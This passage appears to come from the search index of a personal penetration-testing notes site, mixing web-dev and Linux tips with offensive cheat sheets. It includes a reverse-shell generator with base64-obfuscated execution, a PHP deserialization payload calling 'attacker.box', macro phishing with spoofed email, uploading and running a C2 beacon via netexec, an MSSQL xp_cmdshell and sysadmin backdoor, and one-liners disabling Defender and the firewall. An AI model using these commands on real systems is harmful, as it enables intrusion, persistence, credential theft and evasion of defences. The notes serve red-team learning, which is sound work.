breaking changes made in commit messages.\nThe commit message should be structured as follows:\n\u003ctype\u003e[optional scope]: \u003cdescription\u003e [optional body] [optional footer(s)] The commit contains the following structural elements, to communicate intent to the consumers of your library:\nfix: a commit of the type fix patches a bug in your codebase (this correlates with PATCH in Semantic Versioning). feat: a commit of the type feat introduces a new feature to the codebase (this correlates with MINOR in Semantic Versioning). BREAKING CHANGE: a commit that has a footer BREAKING CHANGE:, or appends a ! after the type/scope, introduces a breaking API change (correlating with MAJOR in Semantic Versioning). A BREAKING CHANGE can be part of commits of any type. types other than fix: and feat: are allowed, for example @commitlint/config-conventional (based on the Angular convention) recommends build:, chore:, ci:, docs:, style:, refactor:, perf:, test:, and others. footers other than BREAKING CHANGE: \u003cdescription\u003e may be provided and follow a convention similar to git trailer format. Additional types are not mandated by the Conventional Commits specification, and have no implicit effect in Semantic Versioning (unless they include a BREAKING CHANGE). A scope may be provided to a commit’s type, to provide additional contextual information and is contained within parenthesis, e.g., feat(parser): add ability to parse arrays.\nRef: https://www.conventionalcommits.org/en/v1.0.0/"},"title":"versioning"},"/bazaar/computer-science--programming/web-dev-cheatsheet/":{"data":{"":"","#":"Tech stack TLDR - Frontend: svelte / react / *nothing* (aka html + javascript) - Backend: Nextjs (javascript) / express (javascript) / flask (python) / Laravel (php) - CSS: Tailwindcss - Runtime: - Javascript (express / nextjs): Deno or Bun - https://docs.deno.com/examples/next_tutorial/ - Good comparaison here: https://betterstack.com/community/guides/scaling-nodejs/nodejs-vs-deno-vs-bun/#security - PHP (laravel): Nginx for easy mode, but recommend FrankenPHP or swoole for speed - https://laravel.com/docs/11.x/deployment#server-configuration - https://dev.to/dimdev/performance-benchmark-of-php-runtimes-2lmc - Python (flask): WSGI server like Gunicorn (might be worth using supervisor too) - https://shivamrana.me/2020/05/flask-prod/ - Databases: - sqlite (for prototyping or small ass website) - postgresql - [optional] supabase - Other: - Queue system (and caching): Redis - Secrets manager: Hashicorp Vault - Reverse proxy: (anton Putra on youtube has great comparaisons) - HAProxy for speed and when using TLS - caddy for ease of use and when using TLS - nginx for speed and stability - traefik for ease of use with orchestrators like docker - sending emails: - resend.com CSS frameworks Utility-based:\nhttps://tailwindcss.com/ Classless (good for prototyping):\nhttps://simplecss.org/ Branding Colors Choosing colors:\nhttps://coolors.co https://www.tailwindshades.com/ Color wheels and color theory:\nhttps://www.figma.com/color-wheel/ https://www.canva.com/colors/color-wheel/ https://www.flux-academy.com/blog/ultimate-guide-to-choosing-colors-for-web-design Fonts https://fonts.google.com/ Icons Generic:\nhttps://lucide.dev/ https://heroicons.com/ Brand Icons:\nhttps://simpleicons.org/ https://github.com/homarr-labs/dashboard-icons/blob/main/ICONS.md Design and image editing https://figma.com https://www.photopea.com/ https://canva.com/ https://www.gimp.org/ Free Stock Photos / placeholder content Favorites:\nhttps://unsplash.com/ https://www.pexels.com/ Others:\nhttps://www.pexels.com/ https://pixabay.com/ https://coverr.co/ https://unsplash.com/ https://pikwizard.com/ https://www.videezy.com/ https://mixkit.co/ https://www.canva.com/ https://mixkit.co/free-stock-video/ gfycat.com - free videos that do need citation https://avopix.com/premium-videos Ref:\nhttps://www.reddit.com/r/PartneredYoutube/comments/11l3hnn/is_there_any_place_i_can_get_cheaper_or_free/ Illustrations https://undraw.co/illustrations/2 SEO Blogging For non-tech-savvy: https://ghost.org/ For tech-savvy (static site generator): https://gohugo.io/ "},"title":"web dev cheatsheet"},"/bazaar/computer-science--programming/web-proxies/":{"data":{"":"","#":"Caddy Common infinite redirect issues cloudflare not in Full TLS mode (strict) The “classic” issue with Cloudflare proxy is when the client connects to Cloudflare over TLS but Cloudflare connects to Caddy over HTTP (Flexible mode), causing Caddy redirecting Cloudflare to HTTPS, but the end client is already on HTTPS, so they try again… and receive a redirect to what looks like the same place, ad nauseum.\ncloudflare dns token is not whitelisted from ipv4 or ipv6 $ journalctl -xeu caddy.service ... Code:9109 Message:Cannot use the access token from location: \u003cip\u003e hostname not being passed down sub.example.com { reverse_proxy http://localhost:10002 { header_up Host {http.reverse_proxy.upstream.host} } } dont forget to reload the service after fixing issues sudo systemctl reload caddy "},"title":"Web Proxies"},"/bazaar/linux/other-commands/":{"data":{"":"","#":"Other Linux Commands # find files and pretty print them find /home -type f -printf \"%f\\t%p\\t%u\\t%g\\t%m\\n\" 2\u003e/dev/null | column -t # find .php files which do not contain \"_SECURE_\" rg --files-without-match \"_SECURE_\" **/*.php "},"title":"Other commands"},"/bazaar/linux/reverse-shells/":{"data":{"":"","#":"Generate a quick bash reverse shell in python genshell.py#!/usr/bin/env python3 import base64 import sys import os if \"-h\" in sys.argv or \"--help\" in sys.argv or len(sys.argv) != 3: print(\"[!] INTERFACES:\") print(os.popen(\"ip a\").read().strip()) print(\"\") print(\"[!] Usage: genshell \u003cIP\u003e \u003cPORT\u003e\") exit(1) ip = sys.argv[1] port = sys.argv[2] rev_shell = f'bash -i \u003e\u0026 /dev/tcp/{ip}/{port} 0\u003e\u00261' print(f'[*] command: {rev_shell}') exec_cmd = f'echo {base64.b64encode(rev_shell.encode()).decode()} | base64 -d | /bin/bash' print(exec_cmd) "},"title":"Reverse Shells"},"/bazaar/linux/system-hardening/":{"data":{"":"","#":"OpenSnitch OpenSnitch is a GNU/Linux interactive application firewall inspired by Little Snitch. Ref: https://github.com/evilsocket/opensnitch\nWarning\nappindicators which is required for the system tray icon is buggy and seems to produce a lot of syslog errors: journalctl --since \"1 hour ago\"\nRecommend installing and using Tray Icons: Reloaded instead: https://extensions.gnome.org/extension/2890/tray-icons-reloaded/\nNote\nWorks more or less with VPNs… YMMV.\nOther speedup configs Caution\nTread at your own risk… A lot of these things can fuck-up your device and might be annoying to undo or fix easily. But we all have installation scripts and backups right…. right?!\nMonitor journalctl --since \"1 hour ago\" for bugs and application errors which might use up battery, or other hardware resources. Need to run as admin to see all messages otherwise you will only see logs related to your system.\ngnome-shell editor: dconf-editor\nTo look into:\nhttps://askubuntu.com/questions/346211/tracker-store-and-tracker-miner-fs-eating-up-my-cpu-on-every-startup Hardening scripts debian-cis Warning\nSome of these may not be desirable to have hardened on host machines.\nRef: https://github.com/ovh/debian-cis\n# Installation # need root to cp into /etc/default/cis-hardening cd debian-cis cp debian/default /etc/default/cis-hardening sed -i \"s#CIS_LIB_DIR=.*#CIS_LIB_DIR='$(pwd)'/lib#\" /etc/default/cis-hardening sed -i \"s#CIS_CHECKS_DIR=.*#CIS_CHECKS_DIR='$(pwd)'/bin/hardening#\" /etc/default/cis-hardening sed -i \"s#CIS_CONF_DIR=.*#CIS_CONF_DIR='$(pwd)'/etc#\" /etc/default/cis-hardening sed -i \"s#CIS_TMP_DIR=.*#CIS_TMP_DIR='$(pwd)'/tmp#\" /etc/default/cis-hardening # Audit everything ./bin/hardening.sh --audit-all # audit single item ./bin/hardening/4.4_logrotate_permissions.sh --audit # Apply a fix / harden ./bin/hardening/4.4_logrotate_permissions.sh --apply "},"title":"system hardening"},"/bazaar/other-cheatsheets/":{"data":{"":"","#":"General https://www.thehacker.recipes/ (Better than hacktricks imo) https://viperone.gitbook.io/pentest-everything (great for AD stuff) hacktricks https://www.ired.team/ - always find gems in here. More oldschool but pretty awesome and well explained https://exploit-notes.hdks.org/ (found when looking for something specific, looks interesting) https://watchdogsacademy.gitbook.io/attacking-active-directory (found when looking at mssql stuff, also has cool shit I think) https://werebug.com/pentest-cheatsheet/ - cool layout for a cheatsheet, mostly basic content https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition - pretty well maintained cheatsheet https://notes.qazeer.io/ Mindmaps https://orange-cyberdefense.github.io/ocd-mindmaps/ (It looks cool but I’ve honestly never used this…) "},"title":"++ cyber cheatsheets"},"/bazaar/other/password-cracking/":{"data":{"":"","#":"Common Password generation Password generation using Regex # tool installation # pipx install exrex exrex \"((W|w)inter|(S|s)ummer|(F|f)all|(A|a)utumn|(S|s)pring)20(16|17|18|19|20)\" \u003e seasons_months.txt exrex \"((J|j)anuary|(F|f)ebruary|(M|m)arch|(A|a)pril|(M|m)ay|(J|j)une|(J|j)uly|(A|a)ugust|(S|s)eptember|(O|o)ctober|(N|n)ovember|(D|d)ecember)20(16|17|18|19|20)\" \u003e\u003e seasons_months.txt Keyboard Walks Generating keyboard walks based on keyboard layout:\n# https://github.com/hashcat/kwprocessor kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route \u003e keymap.txt Ref: https://cyberarms.wordpress.com/2018/02/13/creating-hashcat-keymap-walking-password-wordlists/\nRef https://github.com/Mebus/cupp https://specopssoft.com/blog/predictable-passwords-seasons-and-months/ https://cyberarms.wordpress.com/2018/02/13/creating-hashcat-keymap-walking-password-wordlists/ "},"title":"Password Cracking"},"/bazaar/phishing/":{"data":{"":"","#":" Warning\nWIP… Only added basic commmands now that seem to work quite well for test environments with basic security controls aka MS Defender AV.\nThese most likely wont work against any EDR solution… DYOR.\nWord Macros Important\ndocx word docs don’t execute macros (they may be contained in the document but in read only mode), create a docm or doc instead\nFocus on hta, docm, and js payloads\nMacro pack MacroPack Community is a tool used to automatize obfuscation and generation of retro formats such as MS Office documents or VBS like format. It also handles various shortcuts formats.\n# List all supported file formats macro_pack.exe --listformats # List all available templates macro_pack.exe --listtemplates # Craft a payload ... Note\nThe EmbedExe template has been quite good in the past as it allows you to provide you C2 payload directly via exe or bin , utilising either a smb beacon or http beacon.\nWhen using the smb beacon, you can try and spray the network to guess if its running or not\nSending Emails: swaks To send emails to a mail service (eg. SMTP, IMAP, etc) from the command line, swaks is your go to tool.\nIt provides nice features for attaching documents, spoofing senders, etc.\nSending emails with payloads as attachments # links in body can be used if the user is going to click on it # otherwise you can also attach files to it # --server : mail server # --attach @totally-not-malicious.docm : attach the file name `totally-not-malicious.docm` to the email # --suppress-data : don't print the attachment back to you swaks --from vladimir.putin@target.com --to sam.altman@target.com --header 'Subject: Company Notification' --body 'Hi Sam, we want to hear from you! Please complete the following survey. https://mywebsite.com/mysurvey.hta' --server 10.10.10.10 --attach @totally-not-malicious.docm --suppress-data Refs https://github.com/cymerkabrol/doc-macro-exploit https://github.com/itm4n/VBA-RunPE https://github.com/sevagas/macro_pack https://github.com/Inf0secRabbit/BadAssMacros "},"title":"Phishing"},"/bazaar/web-exploitation/php/":{"data":{"":"","#":"Online PHP runner with various PHP version https://onlinephp.io/\nDangerous functions htmlspecialchars htmlspecialchars — Convert special characters to HTML entities Ref: https://www.php.net/manual/en/function.htmlspecialchars.php\nDepending on the php version, the defaults my be different and not encode all characters. For example ' (single quote) is not converted by default in all PHP versions:\nHTML special chars demo with PHP v7.4.33 vs PHP v8.2.20 Deserialization with phpggc PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.\nIf you need to find libraries used by the application, look for composer.json or composer.lock\n# show list of gadget chains ./phpggc -l # deserialization via phar file # (phar doesnt care about the extension) # ZendFramework/RCE1 gadget selected here, but can be anything that supports __destruct or __wakeup vector ./phpggc -p phar -o /tmp/revshell.anything ZendFramework/RCE1 system \"curl http://attacker.box/phar\" "},"title":"PHP"},"/bazaar/wifi/":{"data":{"":"","fixing-issues-with-drivers#Fixing issues with drivers":" This driver is great for most chipsets: https://github.com/lwfinger/rtw88\nIf having issued with kernel headers sudo apt update sudo apt upgrade sudo apt dist-upgrade sudo reboot # install the linux kernel headers as recommended by the git repo ","gps-device#GPS device":"Difference between GPS and GNSS GPS (Global Positioning System) is a specific satellite navigation system operated by the United States. It’s the most widely used and recognized global positioning system.\nGNSS (Global Navigation Satellite System) is a general term that refers to all satellite-based navigation systems, including:\nGPS (United States) GLONASS (Russia) Galileo (European Union) BeiDou (BDS) (China) QZSS (Japan, regional coverage) NavIC (India, regional coverage) Finding your GPS device lsusb # should be something like `/dev/ttyUSB0`, `/dev/ttyUSB1`, ..., `/dev/ttyACM0`, `/dev/ttyACM1`, etc. ls /dev/tty* Testing with gpsd sudo apt install gpsd gpsd-clients sudo gpsd /dev/ttyACM0 -F /var/run/gpsd.sock cgps -s Using bettercap with a GNSS device # this will show you if you have issues with the gps: # sudo bettercap -iface wlan0 --debug # wlan0 » set gps.device \"/dev/ttyACM0\" # wlan0 » gps on # wlan0 » [16:10:38] [sys.log] [dbg] gps error parsing line ''7@': nmea: sentence does not start with a '$' or '!' # instead you need to start the gpsd service and set bettercap to use that instead as such: # start GPSD with you GNSS device # this will start GPSD on localhost:2947 sudo gpsd /dev/ttyACM0 -F /var/run/gpsd.sock sudo bettercap -iface wlan0 \u003e set gps.device \"localhost:2947\" \u003e gps show ","print-wifi-ssid-from-hash#Print Wifi SSID from hash":" cat dump.hashcat | egrep -v \"^$\" | python2 -c \"import sys; print(''.join([l.split('*')[5].decode('hex')+'\\t'+l for l in sys.stdin]))\" ","wifi#Wifi":"Changing mac address Some APs might try to block you or deauth you when they see you testing Wifi, hence changing your mac address might be helpful to bypass those restrictions:\n# change to a random mac emulating a random vendor MAC of any kind sudo macchanger wlan0 -A "},"title":"_index"},"/bazaar/windows/":{"data":{"":""},"title":"Windows"},"/bazaar/windows/active-directory/":{"data":{"":"Other tools:\nenum4linux-ng "},"title":"Active Directory"},"/bazaar/windows/active-directory/ad-enumeration/":{"data":{"":"","#":" Note\nMachine accounts are Domain accounts and can be used to authenticate and talk to LDAP.\nAD enumeration with powerview / powerview.py # Get all users in the current domain Get-DomainUser | select -ExpandProperty cn # Get all computers in the current domain Get-DomainComputer # Get all domains in current forest Get-ForestDomain # Get domain/forest trusts Get-DomainTrust Get-ForestTrust # Get information for the DA group Get-DomainGroup \"Domain Admins\" # Find members of the DA group Get-DomainGroupMember \"Domain Admins\" | select -ExpandProperty membername # Find interesting shares in the domain, ignore default shares, and check access Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess # Get OUs for current domain Get-DomainOU -FullData # Get computers in an OU # %{} is a looping statement Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname # Get GPOs applied to a specific OU Get-DomainOU *WS* | select gplink Get-DomainGPO -Name \"{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}\" # Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers # Get the computers where users are part of a local group through a GPO restricted group Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName # Find principals that can create new GPOs in the domain Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=targetdomain,DC=com\" -ResolveGUIDs | ?{ $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier # Find principals that can link GPOs to OUs Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier # Get incoming ACL for a specific object Get-DomainObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights # Find interesting ACLs for the entire domain, show in a readable (left-to-right) format Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains \"DnsAdmins\"} | ft # Get interesting outgoing ACLs for a specific user or group # ?{} is a filter statement Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match \"Domain Admins\"} | select ObjectDN,ActiveDirectoryRights Powerview from Linux System: powerview.py PowerView.py is an alternative for the awesome original PowerView.ps1 script. Most of the modules used in PowerView are available here ( some of the flags are changed ). Main goal is to achieve interactive session without having to repeatedly authenticate to ldap.\nRef: https://github.com/aniqfakhrul/powerview.py\nWarning\nIt might not return all properties by default, recommended to run all commands with -Properties * to get all the details like LAPS password for machines (if you have the perms) or delegation metadata like msDS-AllowedToActOnBehalfOfOtherIdentity\n# running over proxychains and using powerview to connect to LDAP of dc01.pinecorp.internal proxychains4 -q powerview 'john.doe':'AmazingP@ss'@dc01.pinecorp.internal --use-ldap -ns 10.10.10.10 # supports some functionality to help with OPSEC... althought never tested so not sure what they do --no-admin-check Skip admin check when first logging in --obfuscate Obfuscate search filter Modules available: https://github.com/aniqfakhrul/powerview.py?tab=readme-ov-file#module-available-so-far\nADSearch # List users execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"objectCategory=user\" # List admins execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=group)(cn=*Admins))\" # List MS SQL Admins execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=group)(cn=MS SQL Admins))\" --attributes cn,member # kerberoasting execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName # as-rep roasting execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" --attributes cn,distinguishedname,samaccountname # unconstrained delegation execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname # constrained delegation execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=computer)(msds-allowedtodelegateto=*))\" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json Other alternatives https://github.com/The-Viper-One/PsMapExec "},"title":"AD Enumeration"},"/bazaar/windows/active-directory/lateral-movement/":{"data":{"":"","#":"netexec Upload and execute file on target(s):\n#TARGET=\"topwn.txt\" #TARGET=\"computers.txt\" TARGET=\"mx01.target.local\" #TARGET=\"srv.target.local\" USER=\"asdf_da\" #USER=\"users.txt\" #PASSHASH=\"-p myshittypass\" #PASSHASH=\"-H \\\"44444444444444444444444444444444\\\"\" PASSHASH=\"-H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3\" SOURCE_BIN=\"/home/kali/webserver/demon.x64.exe\" # full path TARGET_BIN=\"cmon.exe\" # just the bin name and ext EXEC_METHOD=\"--exec-method atexec\" #EXEC_METHOD=\"\" EXTRA=\"\" #EXTRA=\"--laps\" #EXTRA=\"--laps MyLocalAdministrator\" netexec smb $TARGET -u \"$USER\" $PASSHASH --put-file \"$SOURCE_BIN\" \"\\\\Windows\\\\Temp\\\\$TARGET_BIN\" -x \"C:\\\\Windows\\\\Temp\\\\$TARGET_BIN\" $EXEC_METHOD $EXTRA WinRm : Enter-PSSession / evil-winrm ports: 5985 (HTTP) and 5986 (HTTPS) (Below Windows 7: 80 and 443) # finding open ports nmap -p5985,5986 -iL computers.txt -Pn -v # Connect from Linux evil-winrm -i Server01 -u USER -p PASS # Connect from Windows Enter-PSSession Server01 # automation (python3) # pip install pywinrm # (see ref for optional deps) # ref: https://pypi.org/project/pywinrm/ import winrm sess = winrm.Session( '10.10.10.10', auth=( 'administrator', 'badminton' ), transport='ntlm' ) # run powershell command r = session.run_ps(\"whoami\") print(r.std_out) print(r.std_err) # run print(session.run(\"type c://users//mike//Desktop//flag.txt\").std_out) About WinRm Using the WS-Management protocol, Windows PowerShell remoting lets you run any Windows PowerShell command on one or more remote computers.\nTo start an interactive session with a single remote computer, use the Enter-PSSession cmdlet. For example, to start an interactive session with the Server01 remote computer, type:\nEnter-PSSession Server01 ~ Microsoft Docs1\nMicrosoft has implemented the WS-Management standard in Windows Remote Management 1.1 (WinRM)\nBy default WinRM HTTP uses port 80 and HTTPS uses port 443. On Windows 7 and higher the default ports are 5985 and 5986, respectively. ~ Wikipedia2\nhttps://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.4#windows-powershell-remoting ↩︎\nhttps://en.wikipedia.org/wiki/WS-Management ↩︎"},"title":"Lateral Movement"},"/bazaar/windows/active-directory/mssql/":{"data":{"":"","#":"General Guest Authentication can be allowed. If so, check if you can impersonate other users. Look for linked servers, the user you can login as might be different. Also you may be able to impersonate someone else there If you’re on a windows server, look for inetpub config files Impacket-MSSQL # authentication via windows auth impacket-mssqlclient LAB/myuser:mypass123@sql.lab.local -windows-auth # mssqlclient recon enum_links enum_logins enum_impersonate Helper proxychains4 -q impacket-mssqlclient LAB/myuser:mypass123@sql.lab.local -windows-auth Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(SQL01): Line 1: Changed database context to 'master'. [*] INFO(SQL01): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (110 2789) [!] Press help for extra shell commands SQL (LAB\\myuser dbo@master)\u003e help lcd {path} - changes the current local directory to {path} exit - terminates the server process (and this session) enable_xp_cmdshell - you know what it means disable_xp_cmdshell - you know what it means enum_db - enum databases enum_links - enum linked servers enum_impersonate - check logins that can be impersonated enum_logins - enum login users enum_users - enum current db users enum_owner - enum db owner exec_as_user {user} - impersonate with execute as user exec_as_login {login} - impersonate with execute as login xp_cmdshell {cmd} - executes cmd using xp_cmdshell xp_dirtree {path} - executes xp_dirtree on the path sp_start_job {cmd} - executes cmd using the sql server agent (blind) use_link {link} - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step) ! {cmd} - executes a local shell cmd show_query - show query mask_query - mask query SQL Commands # Current login name - ie. the user you're logged in as # if you are using windows auth, this should be something like LAB\\user SELECT SYSTEM_USER; # The database user (gives you an idea of the permissions your authed user has) SELECT USER; # list databases SELECT name FROM master..sysdatabases; # list linked servers EXEC sp_linkedservers; # list logins available for impersonation SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; # check if XP_CMDSHELL is enabled SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'; # enable XP_CMDSHELL # requires privileges EXEC sp_configure 'show advanced options', 1 RECONFIGURE EXEC sp_configure 'xp_cmdshell', 1 RECONFIGURE EXEC xp_cmdshell 'whoami' # UNC Path injection - capture with responder, smbserver, ntmrelayx or equivalent EXEC master..xp_dirtree '\\\\10.10.10.10\\share\\test.txt'; SQL Commands: Backdoor Make new database login (username TESTUSER, password L0ngP4ss123), map it to the db_owner and assign the sysadmin role:\nCREATE LOGIN [TESTUSER] WITH PASSWORD=N'L0ngP4ss123!'; CREATE USER [TESTUSER] FOR LOGIN [TESTUSER]; ALTER ROLE [db_owner] ADD MEMBER [TESTUSER]; EXEC master..sp_addrolemember @rolename=N'db_owner', @membername=N'TESTUSER'; EXEC master..sp_addsrvrolemember @rolename=N'sysadmin', @loginame=N'TESTUSER'; EXEC master..sp_addremotelogin 'SQLSRV01\\SQLEXPRESS', 'TESTUSER'; References and tools https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql https://github.com/lefayjey/SharpSQLPwn https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet https://watchdogsacademy.gitbook.io/attacking-active-directory/mssql-servers-exploitation/mssql-trusted-links https://github.com/quentinhardy/msdat "},"title":"MSSQL"},"/bazaar/windows/defence-evasion/":{"data":{"":"","#":" Caution\nOnly use these in controlled test environments which can be reset easily (eg. CTFs, boot2root, Offsec Exams)\nDisabling defences Disable defender, all firewall rules and set execution policy to unrestricted:\nSet-ExecutionPolicy Unrestricted;Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference; Execution Policy blocking commands powershell -noexit -ExecutionPolicy Bypass [optional cmd you wish to run] # show execution policy Get-ExecutionPolicy # remove execution policy Set-ExecutionPolicy Unrestricted Firewall # Disable all Firewall profiles (Requires Admin privileges). Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False Set-NetFirewallProfile -Enabled False Defender # Turn off everything and set exclusion to \"C:\\Windows\\Temp\" Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference # ----- # Check if Defender is enabled Get-MpComputerStatus Get-MpComputerStatus | Select AntivirusEnabled # Check if defensive modules are enabled Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL # Check if tamper protection is enabled Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL # ----- # Disables realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Disables scanning for downloaded files or attachments Set-MpPreference -DisableIOAVProtection $true # Disable behaviour monitoring Set-MPPreference -DisableBehaviourMonitoring $true # Make exclusion for a certain folder Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\" # Disables cloud detection Set-MPPreference -DisableBlockAtFirstSeen $true # Disables scanning of .pst and other email formats Set-MPPreference -DisableEmailScanning $true # Disables script scanning during malware scans Set-MPPReference -DisableScriptScanning $true # Exclude files by extension Set-MpPreference -ExclusionExtension \"ps1\" Ref: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender#firewall\nAppLocker C:\\windows\\tasks C:\\Windows\\System32\\spool\\drivers\\color Ref: https://github.com/api0cradle/UltimateAppLockerByPassList/tree/master?tab=readme-ov-file\nAppLocker: Finding writeable directories # Look for writeable paths in the C:\\windows directory $a = Get-ChildItem \"c:\\windows\\\" -recurse -ErrorAction SilentlyContinue $a | % { $fileName = $_.fullname $acls = get-acl $fileName -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match \"full|modify|write\" -and $_.identityreference -match \"authenticated users|everyone|$env:username\"} if($acls -ne $null) { [pscustomobject]@{ filename = $fileName user = $acls | select -exp identityreference } } } UAC Bypass The repo below has a great list of UAC bypasses to use in various condition (GUI, DLL hijack, etc). Easily modifiable to create a BOF or tool which does the same thing.\nDefeating Windows User Account Control Ref: https://github.com/hfiref0x/UACME"},"title":"Defence Evasion"},"/bazaar/windows/forensics/":{"data":{"":"","#":"Event logs # list event logs Get-EventLog -List # search eventlogs Get-EventLog -LogName \"NAME\" | where {$_.Message -like '*CUSTOM*'} | select Message | format-table -wrap # same same but different Get-EventLog -LogName \"NAME\" | where {$_.Message -like '*CUSTOM*'} | select Message | fl Network Packet Capture Note\nWindows now ships with pktmon which contains a lot of the below funtionality builtin. Worth a look. Ref: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pktmon\nThe Windows netsh built-in utility can be used to the traffic of the local system. The network capture will be exported in the ETL format:\n# Captures the local network traffic, optionally to the specified IP. netsh trace start capture=yes [tracefile=\u003cOUTPUT_ETL\u003e] [IPv4.Address=\u003cIP\u003e] # netsh trace start capture=yes report=disabled # Stops the network capture. netsh trace stop Convert to pcap using etl2pcapng Windows: https://github.com/microsoft/etl2pcapng\nLinux: https://github.com/aaptel/etl2pcap.git\nMerge multiple pcaps together # linux mergecap -w \u003cnew pcap\u003e \u003cpcap 1\u003e \u003cpcap 2\u003e [...] "},"title":"Forensics"},"/bazaar/windows/misc-snippets/":{"data":{"":"","other-useful-commands#Other useful commands":"Windows # Windows useful commands # list named pipes ls \\\\.\\pipe\\ # Find all shares, List share content and cat remote file on a share net view \\\\10.10.10.10 /all Get-SmbShare -CimSession \"10.10.10.10\" IncludeHidden ls \\\\10.10.10.10\\SYSVOL\\ cat \\\\10.10.10.10\\public\\asdf.txt # shares on local machines net shares Get-SMBShare -IncludeHidden # Ping scan in cmd (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find \"Reply\" Linux # quick way to get all IPs for computers on the domain from a list of domain names # replace 10.10.10.10 with the DNS server (most likely the domain controller) proxychains4 -q bash -c 'for computer in `cat computers.txt`; do dig +noall +answer +tcp @10.10.10.10 \"$computer\" ; done' | tee dig-computers.txt ","running-tools-from-non-domain-joined-machines#Running tools from Non-Domain Joined Machines":" Note\nTools may require additional environment variables, parameters and co to be set. You may also have issues with DNS if your routing is not set properly\nWarning\nThe initial command does not check if the credentials are valid. Credentials are only checked during authentication when other tools are ran.\n# Create a powershell instance running as the DOMAIN\\USER account runas /netonly /user:DOMAIN\\USER \"powershell.exe -exec bypass\" # check if the credentials are valid for example by running ls on a share you know if open and readable ls \\\\\u003cdomain-controller\u003e\\SYSVOL\\ # run commands that will make network communications Enter-PSSession -ComputerName ... Sharphound.exe "},"title":"Misc Snippets"},"/bazaar/windows/outlook-exchange-server/":{"data":{"":"","#":"Using Python to send Mail via the Outlook web interface Info\nquick download: git clone https://gist.github.com/fyxme/7dd838dc406c3b76ee722b89e5893d33\nSending Mail via the Outlook web interface using NTLM and Python:\nsend-mail.py# installing requirements # pip install exchangelib from exchangelib import Configuration, Credentials, Account, Message, Mailbox, FileAttachment,DELEGATE, HTMLBody import sys, json # bypass SSL from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter if __name__ == \"__main__\": U = 